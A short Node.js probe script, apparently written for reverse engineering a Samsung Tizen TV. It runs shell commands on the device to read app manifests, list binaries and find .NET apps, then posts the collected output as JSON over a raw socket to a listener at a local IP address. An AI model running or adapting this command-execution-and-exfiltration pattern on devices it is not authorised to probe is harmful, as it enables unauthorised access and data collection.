"use strict";

/* p13: cat .NET tizen-manifest.xml files (csfs + mycontents) — learn exact manifest format */
var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var R = { ts: new Date().toISOString(), probe: 'p13', results: {}, log: [] };

function L(s) { R.log.push(String(s).substring(0, 500)); }
function run(cmd, timeout) {
  try {
    return cp.execSync(cmd, { timeout: timeout || 20000, maxBuffer: 16 * 1024 * 1024 }).toString().trim();
  } catch (e) {
    var out = '';
    if (e.stdout) out += e.stdout.toString();
    if (e.stderr) out += (out ? '\n' : '') + e.stderr.toString();
    return '[err] ' + (out || (e && e.message) || 'unknown');
  }
}

function postRaw(path, text) {
  var buf = new Buffer(text, 'utf8');
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: text/plain\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  var sock = null;
  try { sock = net.connect(PORT, HOST); } catch (e) { L('post ctor ' + e); return; }
  sock.on('connect', function () {
    try { sock.write(hdr); } catch (e) {}
    var off = 0;
    var iv = setInterval(function () {
      if (off >= buf.length) { clearInterval(iv); setTimeout(function () { try { sock.destroy(); } catch (e) {} }, 3000); return; }
      try { sock.write(buf.slice(off, off + 4096)); } catch (e) {}
      off += 4096;
    }, 100);
    setTimeout(function () { try { sock.destroy(); } catch (e) {} }, 30000);
  });
  sock.on('error', function (e) { L('post error ' + e.message); });
}

R.results.csfs_tizen_manifest = run('cat /usr/apps/com.samsung.tv.csfs/tizen-manifest.xml 2>&1', 15000);
R.results.mycontents_tizen_manifest = run('cat /usr/apps/com.samsung.tv.mycontents/tizen-manifest.xml 2>&1', 15000);
R.results.csfs_bin = run('ls -la /usr/apps/com.samsung.tv.csfs/bin/ 2>&1; ls -la /usr/apps/com.samsung.tv.csfs/shared/ 2>&1', 15000);
R.results.inhouse_version = run('/usr/bin/dotnet-launcher-inhouse --version 2>&1', 15000);
R.results.all_dotnet_manifests = run('grep -rl "dotnet" /usr/apps/*/tizen-manifest.xml 2>/dev/null | head -15', 40000);
R.results.csfs_appid_exec = run('grep -iE "exec=|appid=|type=|package=" /usr/apps/com.samsung.tv.csfs/tizen-manifest.xml 2>&1', 15000);
R.results.final = 'done ' + new Date().toISOString();
postRaw('/p13info', JSON.stringify(R));
L('p13 done');
